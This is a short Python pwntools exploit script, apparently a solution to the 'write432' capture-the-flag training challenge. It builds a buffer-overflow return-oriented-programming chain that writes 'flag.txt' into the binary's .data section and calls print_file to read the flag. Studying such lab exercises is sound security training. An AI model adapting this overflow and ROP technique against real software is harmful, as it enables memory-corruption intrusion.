#!/usr/bin/python3

from pwn import *

PROG_NAME = "./write432"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

data_addr = 0x0804a018
mov_ptr_edi_ebp_addr = 0x08048543
pop_edi_ebp_addr = 0x080485aa

p.recvuntil(b'> ')

payload = b'A' * (0x28 + 0x4)

for i, string in enumerate([b'flag', b'.txt', b'\x00'*4]):
	# build our string, 4 bytes at a time
	payload += p32(pop_edi_ebp_addr)
	payload += p32(data_addr + i*4)
	payload += string
	payload += p32(mov_ptr_edi_ebp_addr)

# with our .data set up, we can call print_file
payload += p32(elf.symbols['print_file'])
payload += b'A' * 4
payload += p32(data_addr)

p.sendline(payload)

p.interactive()